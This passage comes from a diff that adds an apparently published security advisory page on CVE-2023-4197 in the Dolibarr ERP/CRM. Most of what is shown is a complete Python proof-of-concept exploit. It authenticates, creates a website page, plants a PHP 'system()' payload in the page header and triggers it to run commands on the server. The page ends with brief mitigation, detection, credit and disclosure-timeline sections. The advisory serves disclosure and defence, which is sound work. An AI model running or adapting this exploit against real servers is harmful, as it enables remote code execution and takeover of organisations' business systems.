+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">anti-csrf-newtoken</span><span class="se">\&#34;</span><span class="s2"> content=</span><span class="se">\&#34;</span><span class="s2">(.+)</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Login</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;actionlogin&#34;</span><span class="p">:</span> <span class="s2">&#34;login&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;Logout&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Authentication failed! Are the credentials valid?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Authenticated successfully!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rce</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Create web site</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Attempting to create a website...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">website_name</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;WEBSITE_REF&#34;</span><span class="p">:</span> <span class="n">website_name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;addsite&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;WEBSITE_LANG&#34;</span><span class="p">:</span> <span class="s2">&#34;en&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;addcontainer&#34;</span><span class="p">:</span> <span class="s2">&#34;create&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/website/index.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">f</span><span class="s2">&#34;Website - </span><span class="si">{</span><span class="n">website_name</span><span class="si">}</span><span class="s2">&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Website creation failed!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Created website name: </span><span class="se">\&#34;</span><span class="si">{</span><span class="n">website_name</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Create web page</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Attempting to create a web page...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">webpage_name</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;website&#34;</span><span class="p">:</span> <span class="n">website_name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;addcontainer&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;WEBSITE_TYPE_CONTAINER&#34;</span><span class="p">:</span> <span class="s2">&#34;page&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;WEBSITE_TITLE&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;WEBSITE_PAGENAME&#34;</span><span class="p">:</span> <span class="n">webpage_name</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/website/index.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">f</span><span class="s2">&#34;Contenair </span><span class="se">\\</span><span class="s2">&#39;</span><span class="si">{</span><span class="n">webpage_name</span><span class="si">}</span><span class="se">\\</span><span class="s2">&#39; added&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Web page creation failed!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Created web page name: </span><span class="se">\&#34;</span><span class="si">{</span><span class="n">webpage_name</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Modify created page</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Attempting to modify the web page...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">webpage_id</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&lt;option value=</span><span class="se">\&#34;</span><span class="s2">(.+)</span><span class="se">\&#34;</span><span class="s2"> .+</span><span class="si">{</span><span class="n">webpage_name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;website&#34;</span><span class="p">:</span> <span class="n">website_name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;WEBSITE_PAGENAME&#34;</span><span class="p">:</span> <span class="n">webpage_name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;pageid&#34;</span><span class="p">:</span> <span class="n">webpage_id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;updatemeta&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;htmlheader&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;&lt;? echo system(&#39;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&#39;); ?&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/website/index.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;Saved&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Web page modification failed!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Web page modified successfully!&#34;</span><span class="p">)</span>      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Trigger RCE</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Triggering RCE now via: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/public/website/index.php?website=</span><span class="si">{</span><span class="n">website_name</span><span class="si">}</span><span class="s2">&amp;pageref=</span><span class="si">{</span><span class="n">webpage_name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/public/website/index.php?website=</span><span class="si">{</span><span class="n">website_name</span><span class="si">}</span><span class="s2">&amp;pageref=</span><span class="si">{</span><span class="n">webpage_name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Web page is not reachable!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;block --&gt;</span><span class="se">\n</span><span class="s2">(.+)&lt;/head&gt;&#34;</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] RCE successful! Output of command:</span><span class="se">\n\n</span><span class="si">{</span><span class="n">output</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">check_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">authenticate</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rce</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/advisories/23/images/CVE-2023-4197_02.Exploit.gif" alt=""  />
+</p>
+<h2 id="suggested-mitigations">Suggested Mitigations:<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
+<p>Update the Dolibarr installation to the latest version as shown from the official repository <a href="https://github.com/Dolibarr/dolibarr/releases">releases page</a>.</p>
+<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
+<p>It is possible to detect the exploitation of this vulnerability by checking the <code>/document/</code> directory (default upload directory) to see if there are any <code>.tpl</code> files containing <code>&lt;?</code> tags, and further inspecting the code contained within.</p>
+<h2 id="credits">Credits:<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
+<p>Poh Jia Hao (<a href="https://twitter.com/Chocologicall">@Chocologicall</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
+<h2 id="timeline">Timeline:<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
+<ul>
+<li>2023-09-04 Reported vulnerability to Dolibarr owner</li>
+<li>2023-09-05 Dolibarr owner acknowledged vulnerability and pushed a patch <a href="https://github.com/Dolibarr/dolibarr/commit/0ed6a63fb06be88be5a4f8bcdee83185eee4087e">commit</a>. Also mentioned that it will be in the next release</li>
+<li>2023-10-11 New version containing patch released</li>
+<li>2023-11-01 Public Release</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://starlabs.sg/advisories/23/23-1720/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>(CVE-2023-1720) Bitrix24 Stored Cross-Site Scripting (XSS) via File Upload</span>
+  </a>
+  <a class="next" href="https://starlabs.sg/advisories/23/23-4198/">
+    <span class="title">Next »</span>
+    <br>
+    <span>(CVE-2023-4198) Dolibarr ERP CRM (&lt;= 17.0.3) Improper Access Control</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
